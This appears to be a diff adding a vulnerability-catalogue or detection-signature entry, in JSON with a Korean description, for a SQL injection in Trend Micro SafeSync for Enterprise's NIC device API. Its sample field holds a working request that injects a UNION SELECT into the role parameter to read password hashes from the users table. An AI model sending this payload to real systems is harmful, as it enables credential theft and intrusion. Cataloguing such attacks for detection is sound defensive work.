@@ -1,0 +1,9 @@
+{
+	"Name": "Trend Micro SSFE get_nic_device SQL Injection",
+	"Description": "- 서버 및 사용자 장치에 동기화 된 데이터 액세스를 제공\n- SafeSync NIC 장치에 대한 정보를 얻기 위해 쿼리를 보낼 때 사용자가 입력한 role 파라미터의 유효성 검사를 제대로 하지 않아 발생\n- 공격 성공 시, 임의의 코드를 실행",
+	"References": [""],
+	"Samples": [
+		"GET /api/admin/storage/nic?role=1+union+select+hpassword+from+users HTTP/1.1"],
+	"Keywords": [],
+	"Signature": []
+}
